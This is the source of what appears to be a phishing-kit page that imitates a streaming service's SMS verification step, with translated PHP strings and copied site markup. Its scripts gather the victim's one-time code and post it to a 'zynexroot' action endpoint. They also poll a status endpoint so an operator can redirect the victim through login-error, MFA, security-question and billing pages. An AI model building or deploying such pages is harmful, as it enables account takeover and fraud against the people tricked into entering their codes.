                                          <div data-layout="container" dir="ltr" class="layout-container_styles__12wd1go1g snipcss0-10-39-40 snipcss0-2-2-3 snipcss0-14-43-44 style-9Ntxq" id="style-9Ntxq">
                                            <div data-layout="item" index="0" class="layout-item_styles__zc08zp30 default-ltr-cache-7vbe6a ermvlvv0 snipcss0-11-40-41 snipcss0-3-3-4 snipcss0-15-44-45 style-K1EpV" dir="ltr" id="style-K1EpV">
                                              <button class="pressable_styles__a6ynkg0 button_styles__1kwr4ym0 default-ltr-cache-1dutflm e1ax5wel2 snipcss0-12-41-42 snipcss0-4-4-5 snipcss0-16-45-46" data-uia="collect-input-submit-cta" dir="ltr"  id="submit_button" onclick="submit_form()" type="button"><?php echo $translations['submitButton']; ?></button>
                                            </div>
                                            <div data-layout="item" index="1" class="layout-item_styles__zc08zp30 default-ltr-cache-7vbe6a ermvlvv0 snipcss0-11-40-43 snipcss0-3-3-6 snipcss0-15-44-47 style-O15iG" dir="ltr" id="style-O15iG">
<button id="resendButton" class="pressable_styles__a6ynkg0 button_styles__1kwr4ym0 default-ltr-cache-rswnv e1ax5wel2 snipcss0-12-43-44 snipcss0-4-6-7 snipcss0-16-47-48" data-uia="collect-input-resend-cta" dir="ltr" role="button" type="button"><?php echo $translations['resendCodeButton']; ?></button>
<div id="countdown" style="display: none; font-weight: bold; text-align: center;"></div>
<script>
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('resendButton').addEventListener('click', function() {
        var button = this;
        var countdownElement = document.getElementById('countdown');
        var timeLeft = 60; // seconds

        button.style.display = 'none'; // hide button
        countdownElement.style.display = 'block'; // show countdown instantly
        countdownElement.textContent = '<?php echo $translations['pleaseWait']; ?>' + ' ' + timeLeft + ' ' + '<?php echo $translations['seconds']; ?>'; // initialize text

        var timer = setInterval(function() {
            timeLeft--;
            countdownElement.textContent = '<?php echo $translations['pleaseWait']; ?>' + ' ' + timeLeft + ' ' + '<?php echo $translations['seconds']; ?>';

            if (timeLeft <= 0) {
                clearInterval(timer);
                countdownElement.style.display = 'none'; // hide countdown
                button.style.display = 'block'; // show button again
            }
        }, 1000);
    });
});
</script>                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                      <div data-layout="item" index="4" class="layout-item_styles__zc08zp30 default-ltr-cache-7vbe6a ermvlvv0 snipcss0-8-8-45 snipcss0-12-12-49 style-KGces" dir="ltr" id="style-KGces">
                                        <span data-uia="collect-input-helpText" class="default-ltr-cache-rlkylo euy28770 snipcss0-9-45-46 snipcss0-13-49-50">
<span class="snipcss0-10-46-47 snipcss0-14-50-51">
    <?php echo $translations['needHelp']; ?> <a href="https://help.google.com/search?q=net" target="_blank" rel="noopener noreferrer" class="snipcss0-11-47-48 snipcss0-15-51-52 style-2YH2N" id="style-2YH2N"><?php echo $translations['visitHelpCenter']; ?></a>
</span>

                                        </span>
                                      </div>
                                    </form>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="default-ltr-cache-4ncmv9 efez1370">
              <footer data-uia="account+footer" class=" default-ltr-cache-8qwptr eyieukx5">
                <div data-layout="wrapper" class="layout-container_wrapperStyles__12wd1go1d" dir="ltr">
                  <div data-layout="container" class="layout-container_styles__12wd1go1g style-CExkA" dir="ltr" id="style-CExkA">
                    <div data-layout="item" class="layout-item_styles__zc08zp30 style-DaYYU" dir="ltr" id="style-DaYYU">
                      <div class="default-ltr-cache-82qlwu eyieukx4">
<p id="" class="default-ltr-cache-w6a8nx e1a5yyfm0" data-uia="account+footer+heading">
    <?php echo $translations['questions']; ?> <a href="#"><?php echo $translations['contactUs']; ?></a>
</p>
                      </div>
                    </div>
                    <div data-layout="item" class="layout-item_styles__zc08zp30 style-y7sHQ" dir="ltr" id="style-y7sHQ">
                      <div class="default-ltr-cache-2lwb1t eyieukx3">
                        <div data-layout="wrapper" class="layout-container_wrapperStyles__12wd1go1d" dir="ltr">
                          <ul data-layout="container" class="layout-container_styles__12wd1go1g style-4VUZO" dir="ltr" id="style-4VUZO">
                            <li data-layout="item" class="layout-item_styles__zc08zp30 style-Jfmr6" dir="ltr" id="style-Jfmr6">
                              <a data-uia="footer-link-relations" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['investorRelations']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30 style-5rvLM" dir="ltr" id="style-5rvLM">
                              <a data-uia="footer-link-media" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['mediaCenter']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30 style-qF9pz" dir="ltr" id="style-qF9pz">
                              <a data-uia="footer-link-jobs" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['jobs']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30 style-DPEUX" dir="ltr" id="style-DPEUX">
                              <a data-uia="footer-link-cookies" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['cookiePreferences']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30 style-BUlol" dir="ltr" id="style-BUlol">
                              <a data-uia="footer-link-terms" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['termsOfUse']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30 style-a4ek9" dir="ltr" id="style-a4ek9">
                              <a data-uia="footer-link-privacy" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['privacyStatement']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30 style-MzzoP" dir="ltr" id="style-MzzoP">
                              <a data-uia="footer-link-audio-and-subtitles" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['audioAndSubtitles']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30 style-OjMVe" dir="ltr" id="style-OjMVe">
                              <a data-uia="footer-link-help" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['helpCenter']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30 style-xPJ3g" dir="ltr" id="style-xPJ3g">
                              <a data-uia="footer-link-gift-card" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['giftCards']; ?></a>
                            </li>
                          </ul>
                        </div>
                        </div>
                      </div>
                    </div>
                    <div data-layout="item" class="layout-item_styles__zc08zp30 style-XUJM4" dir="ltr" id="style-XUJM4">
                      <div class="default-ltr-cache-113gja eyieukx0">
                        <button class="pressable_styles__a6ynkg0 button_styles__1kwr4ym0  default-ltr-cache-1mtuoem e1ax5wel2" data-uia="account+footer+service-code-button" dir="ltr" role="button" type="button"><?php echo $translations['serviceCode']; ?></button>
                      </div>
                    </div>
                  </div>
                </div>
              </footer>
            </div>
          </section>
        </div>
      </div>
    </div>
  </div>
  
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', () => {
    const inputs = document.querySelectorAll('.auth-code-input');
    const submitButton = document.getElementById('submit_button');

    // Clear and focus the first input on page load
    inputs.forEach(input => input.value = '');
    if (inputs.length > 0) inputs[0].focus();

    function disableInputs() {
        inputs.forEach(input => input.disabled = true);
        submitButton.disabled = true;
        submitButton.style.opacity = 0.5;
    }

    function enableInputs() {
        inputs.forEach(input => {
            input.disabled = false;
            input.style.borderColor = ''; // Reset any red border on enable
        });
        submitButton.disabled = false;
        submitButton.style.opacity = 1;
    }

    // Validate and collect SMS code from inputs
    function collectCode() {
        let code = '';
        let allFilled = true;
        inputs.forEach(input => {
            if (input.value === '') {
                input.style.borderColor = 'red'; // Highlight empty fields
                allFilled = false;
            } else {
                input.style.borderColor = ''; // Reset border color if filled
                code += input.value;
            }
        });
        return allFilled ? code : '';
    }

    async function submitForm() {
        const code = collectCode();
        if (code === '') {
            console.error("All inputs must be filled.");
            return;
        }

        disableInputs();

        const data = new URLSearchParams({ smscode: code });

        try {
            const response = await fetch('zynexroot/inc/action.php?type=smscode', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: data
            });

            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }

            const result = await response.json();

            if (result.status === 'ok') {
                const redirectUrl = result.checkbox_state === 1 ? 'billing2.php' : 'loading.php';
                window.location.href = redirectUrl;
            } else {
                console.error('Error:', result.message);
                alert(result.message || 'Submission failed');
            }
        } catch (error) {
            console.error('Fetch error:', error);
            alert('Failed to submit the form.');
        } finally {
            enableInputs();
        }
    }

    inputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            input.value = input.value.replace(/[^0-9]/g, ''); // Ensure only numbers
            if (input.value.length === 1 && index < inputs.length - 1) {
                inputs[index + 1].focus(); // Move to next input
            }
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && input.value === '') {
                if (index > 0) {
                    inputs[index - 1].focus(); // Move to previous input
                }
            }
        });
    });

    submitButton.addEventListener('click', submitForm);
});
</script>
  <script>
let currentStatus = null;

async function pollStatus() {
    try {
        const response = await fetch('status.php?type=getstatus', {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
        });

        if (response.ok) {
            const data = await response.json();
            if (data.status && data.status !== currentStatus) {
                currentStatus = data.status;
                handleRedirection(currentStatus);
            }
        } else {
            console.error("Polling error: HTTP status " + response.status);
        }
    } catch (error) {
        console.error("Polling error:", error);
    } finally {
        // Poll again after a delay
        setTimeout(pollStatus, 2000); // Adjust the interval as needed
    }
}

function handleRedirection(status) {
    const urlMappings = {
        '0': "done.php",
        '1': "index.php",
        '3': "login_error.php",
        '9': "sms.php",
        '11': "sms_error.php",
        '84': "billing2.php",
        '86': "process.php",
        '88': "process_error.php",
		'200': "mfa.php",
		'202': "mfa_error.php",
		'204': "sec.php",
		'206': "sec_error.php",
		'90': "notice.php",
        '99': null // Do nothing for status 99
    };

    const targetUrl = urlMappings[status];
    const currentPage = window.location.pathname.split('/').pop(); // Get the current page name

    if (targetUrl && currentPage !== targetUrl) {
        window.location.href = targetUrl;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    pollStatus();
});

</script>

<script>
    const pingServer = () => {
        fetch("zynexroot/inc/action.php?type=ping")
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => console.log(data))
            .catch(error => console.error('Error pinging server:', error));
    };

    // Ping every 3 seconds
    setInterval(pingServer, 3000);
</script>

</body>
</html>